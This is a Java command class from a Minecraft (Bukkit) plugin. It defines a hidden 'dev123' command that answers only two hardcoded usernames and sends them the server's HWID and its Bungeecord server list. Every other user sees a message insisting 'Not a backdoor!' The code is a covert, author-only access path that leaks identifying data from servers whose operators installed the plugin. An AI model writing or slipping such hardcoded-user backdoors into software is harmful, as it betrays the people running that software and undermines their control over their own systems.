package org.sqldatabase.cronos.Commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.sqldatabase.cronos.Main;
import org.sqldatabase.cronos.Utils.Bungeecord;

public class Dev123CMD implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String c, String[] args) {
		Player p = (Player) sender;
		if(c.equalsIgnoreCase("dev123")) {
			if(sender.getName().equalsIgnoreCase("sqldatabase") || sender.getName().equalsIgnoreCase("readutf")) {
				p.sendMessage("Servers HWID: " + Main.something);
				//--------------------------
				p.sendMessage(Bungeecord.servers.toString());
				
			} else {
				sender.sendMessage("§cThis is a development command. Not a backdoor!");
			}
		}
		return true;
	}

	
	
}